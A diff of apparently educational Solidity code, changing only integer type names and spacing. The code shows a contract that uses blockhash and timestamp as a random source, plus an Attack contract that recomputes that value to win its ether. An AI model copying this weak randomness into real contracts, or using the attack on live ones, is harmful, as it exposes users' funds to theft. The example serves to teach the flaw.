@@ -19,13 +19,13 @@ Attack computed the correct answer by simply copying the code that computes the 
 contract GuessTheRandomNumber {
     constructor() payable {}
 
-    function guess(uint _guess) public {
-        uint answer = uint(
+    function guess(uint256 _guess) public {
+        uint256 answer = uint256(
             keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
         );
 
         if (_guess == answer) {
-            (bool sent, ) = msg.sender.call{value: 1 ether}("");
+            (bool sent,) = msg.sender.call{value: 1 ether}("");
             require(sent, "Failed to send Ether");
         }
     }
@@ -35,7 +35,7 @@ contract Attack {
     receive() external payable {}
 
     function attack(GuessTheRandomNumber guessTheRandomNumber) public {
-        uint answer = uint(
+        uint256 answer = uint256(
             keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
         );
 
@@ -43,7 +43,7 @@ contract Attack {
     }
 
     // Helper function to check balance
-    function getBalance() public view returns (uint) {
+    function getBalance() public view returns (uint256) {
         return address(this).balance;
     }
 }
